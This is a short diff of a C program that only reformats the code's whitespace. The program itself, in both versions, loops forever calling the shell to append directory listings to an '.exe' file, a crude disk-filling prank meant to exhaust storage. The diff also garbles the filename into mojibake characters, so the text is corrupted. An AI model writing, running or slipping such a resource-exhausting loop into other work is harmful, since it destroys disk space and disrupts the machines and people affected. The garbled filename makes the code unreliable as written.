@@ -1,9 +1,9 @@
-#include<stdio.h>
-#include<stdlib.h>
+#include <stdio.h>
+#include <stdlib.h>
 void main()
 {
- while(1) 
-{
- system("dir>>Èa.exe");
-}
+  while (1)
+  {
+    system("dir>>ï¿½a.exe");
+  }
 }
